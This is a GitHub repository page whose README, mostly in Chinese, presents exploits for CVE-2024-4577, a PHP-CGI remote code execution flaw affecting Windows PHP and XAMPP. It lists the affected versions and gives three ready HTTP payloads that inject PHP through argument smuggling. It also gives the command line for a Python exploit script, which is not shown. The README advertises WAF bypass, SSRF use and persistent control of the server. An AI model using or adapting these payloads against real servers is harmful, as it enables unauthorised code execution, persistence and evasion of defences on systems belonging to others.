
[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fxcanwin%2FCVE-2024-4577-PHP-RCE)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fxcanwin%2FCVE-2024-4577-PHP-RCE)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E&source=header-repo&source_repo=xcanwin%2FCVE-2024-4577-PHP-RCE)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[xcanwin](/xcanwin)
/
**[CVE-2024-4577-PHP-RCE](/xcanwin/CVE-2024-4577-PHP-RCE)**
Public

* [Notifications](/login?return_to=%2Fxcanwin%2FCVE-2024-4577-PHP-RCE) You must be signed in to change notification settings
* [Fork
  31](/login?return_to=%2Fxcanwin%2FCVE-2024-4577-PHP-RCE)
* [Star
   127](/login?return_to=%2Fxcanwin%2FCVE-2024-4577-PHP-RCE)

[漏洞复现] 全球首款利用PHP默认环境（XAMPP）的CVE-2024-4577 PHP-CGI RCE 漏洞 EXP。

[127
stars](/xcanwin/CVE-2024-4577-PHP-RCE/stargazers) [31
forks](/xcanwin/CVE-2024-4577-PHP-RCE/forks) [Branches](/xcanwin/CVE-2024-4577-PHP-RCE/branches) [Tags](/xcanwin/CVE-2024-4577-PHP-RCE/tags) [Activity](/xcanwin/CVE-2024-4577-PHP-RCE/activity)
 [Star](/login?return_to=%2Fxcanwin%2FCVE-2024-4577-PHP-RCE)

 [Notifications](/login?return_to=%2Fxcanwin%2FCVE-2024-4577-PHP-RCE) You must be signed in to change notification settings

* [Code](/xcanwin/CVE-2024-4577-PHP-RCE)
* [Pull requests
  0](/xcanwin/CVE-2024-4577-PHP-RCE/pulls)
* [Actions](/xcanwin/CVE-2024-4577-PHP-RCE/actions)
* [Security](/xcanwin/CVE-2024-4577-PHP-RCE/security)
* [Insights](/xcanwin/CVE-2024-4577-PHP-RCE/pulse)

Additional navigation options

* [Code](/xcanwin/CVE-2024-4577-PHP-RCE)
* [Pull requests](/xcanwin/CVE-2024-4577-PHP-RCE/pulls)
* [Actions](/xcanwin/CVE-2024-4577-PHP-RCE/actions)
* [Security](/xcanwin/CVE-2024-4577-PHP-RCE/security)
* [Insights](/xcanwin/CVE-2024-4577-PHP-RCE/pulse)

# xcanwin/CVE-2024-4577-PHP-RCE

    main[Branches](/xcanwin/CVE-2024-4577-PHP-RCE/branches)[Tags](/xcanwin/CVE-2024-4577-PHP-RCE/tags)Go to fileCode
## Folders and files

| Name | | Name | Last commit message | Last commit date |
| --- | --- | --- | --- | --- |
| Latest commit History[2 Commits](/xcanwin/CVE-2024-4577-PHP-RCE/commits/main/) | | |
| [CVE-2024-4577-PHP-RCE.py](/xcanwin/CVE-2024-4577-PHP-RCE/blob/main/CVE-2024-4577-PHP-RCE.py "CVE-2024-4577-PHP-RCE.py") | | [CVE-2024-4577-PHP-RCE.py](/xcanwin/CVE-2024-4577-PHP-RCE/blob/main/CVE-2024-4577-PHP-RCE.py "CVE-2024-4577-PHP-RCE.py") |  |  |
| [README.md](/xcanwin/CVE-2024-4577-PHP-RCE/blob/main/README.md "README.md") | | [README.md](/xcanwin/CVE-2024-4577-PHP-RCE/blob/main/README.md "README.md") |  |  |
| View all files | | |

## Repository files navigation

* README
# CVE-2024-4577-PHP-RCE

## 项目简介与原理

* 全球首款利用PHP默认环境（XAMPP）的CVE-2024-4577 PHP-CGI RCE 漏洞 EXP。
* The world's first CVE-2024-4577 PHP-CGI RCE exploit utilizing the default PHP environment. Sharing original exploit, supports SSRF, supports WAF bypass.
* 实现PHP默认环境RCE。原理：`cgi.force_redirect` + `REDIRECT-STATUS`。
* 新增原创EXP，支持绕过WAF场景的打法。原理：建立FastCGI服务端 + FastCGI协议通讯。
* 新增原创EXP，支持SSRF场景的打法。原理：data://协议 + GET请求。

## EXP 1 的优点

* 无需 `allow_url_include`、`auto_prepend_file`、`auto_append_file` 即可RCE。可包含任意文件和php文件。
* 不会出现WAF经常拦截的关键词 `allow_url_include`、`auto_prepend_file`、`auto_append_file`。
* FastCGI服务端的所有通讯不会被WAF记录。
* 监听新端口，因此实现持久化控制php服务端，独立于apache和php。

## 漏洞简介

| 信息 | 内容 |
| --- | --- |
| 漏洞名称 | PHP RCE |
| 漏洞编号 | CVE-2024-4577 |
| 风险等级 | 高危 |
| 漏洞类型 | RCE |
| 利用难度 | 低 |

## 影响版本

* [PHP Windows版](https://www.php.net/) 8.3.0 <= 影响版本 < 8.3.8
* [PHP Windows版](https://www.php.net/) 8.2.0 <= 影响版本 < 8.2.20
* [PHP Windows版](https://www.php.net/) 8.1.0 <= 影响版本 < 8.1.29
* [PHP Windows版](https://www.php.net/) 影响版本 == 8.0.x
* [PHP Windows版](https://www.php.net/) 影响版本 == 7.x
* [PHP Windows版](https://www.php.net/) 影响版本 == 5.x
* [XAMPP Windows版](https://www.apachefriends.org/) 8.2.0 <= 影响版本 <= 8.2.12
* [XAMPP Windows版](https://www.apachefriends.org/) 8.1.0 <= 影响版本 <= 8.1.25
* [XAMPP Windows版](https://www.apachefriends.org/) 影响版本 == 8.0.x
* [XAMPP Windows版](https://www.apachefriends.org/) 影响版本 == 7.x
* [XAMPP Windows版](https://www.apachefriends.org/) 影响版本 == 5.x

## EXP 1

可用于绕过WAF场景 + 默认场景:

```
python CVE-2024-4577-PHP-RCE.py PhpServerHost:PhpServerPort

```

例如:

```
python CVE-2024-4577-PHP-RCE.py 123.123.123.123:80

```

## EXP 2

可用于SSRF场景 + 默认场景:

```
http://PhpServerHost:PhpServerPort/php-cgi/php-cgi.exe?%add+cgi.force_redirect%3dXCANWIN+-d+allow_url_include%3d1+-d+auto_prepend_file%3d"data:XCANWIN/XCANWIN;base64,PD9waHAgZGllKCJUZSIuInNUIik7Pz4g"

```

## EXP 3

可用于默认场景:

```
POST /php-cgi/php-cgi.exe?%add+cgi.force_redirect%3dXCANWIN+%add+allow_url_include%3don+%add+auto_prepend_file%3dphp%3a//input HTTP/1.1
Host: PhpServerHost

<?php die("Te"."sT");?>

```

## EXP 4

可用于默认场景:

```
POST /php-cgi/php-cgi.exe?%add+allow_url_include%3don+%add+auto_prepend_file%3dphp%3a//input HTTP/1.1
Host: PhpServerHost
REDIRECT-STATUS: XCANWIN

<?php die("Te"."sT");?>

```

## 复现

1. 服务端环境：

```
XAMPP Windows版 8.2.12

```

2. 服务端下载并安装 XAMPP：

```
https://zenlayer.dl.sourceforge.net/project/xampp/XAMPP%20Windows/8.2.12/xampp-windows-x64-8.2.12-0-VS16-installer.exe?viasf=1

或者自主去这里挑受影响版本：https://sourceforge.net/projects/xampp/files/XAMPP%20Windows/

```

3. 服务端配置

```
无需任何修改，保持默认配置

```

4. 客户端使用EXP

```
使用上述EXP进行测试

```

5. 验证

```
观察是否返回字符串 "TesT" 或者服务端system.ini文件内容

```

## About

[漏洞复现] 全球首款利用PHP默认环境（XAMPP）的CVE-2024-4577 PHP-CGI RCE 漏洞 EXP。

### Resources

[Readme](#readme-ov-file)

[Activity](/xcanwin/CVE-2024-4577-PHP-RCE/activity)
### Stars

[**127**
stars](/xcanwin/CVE-2024-4577-PHP-RCE/stargazers)
### Watchers

[**1**
watching](/xcanwin/CVE-2024-4577-PHP-RCE/watchers)
### Forks

[**31**
forks](/xcanwin/CVE-2024-4577-PHP-RCE/forks)
[Report repository](/contact/report-content?content_url=https%3A%2F%2Fgithub.com%2Fxcanwin%2FCVE-2024-4577-PHP-RCE&report=xcanwin+%28user%29)

## Languages

* [Python
  100.0%](/xcanwin/CVE-2024-4577-PHP-RCE/search?l=python)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.

